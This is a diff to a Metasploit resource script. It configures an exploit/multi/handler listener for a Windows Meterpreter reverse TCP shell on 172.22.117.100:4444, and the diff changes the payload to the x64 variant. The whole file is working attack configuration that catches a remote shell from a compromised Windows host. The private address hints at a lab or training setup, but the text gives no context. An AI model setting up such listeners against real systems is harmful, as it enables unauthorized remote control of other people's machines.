@@ -2,7 +2,7 @@
 #resource2.rc
 
 use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 172.22.117.100
 set LPORT 4444
 exploit -j
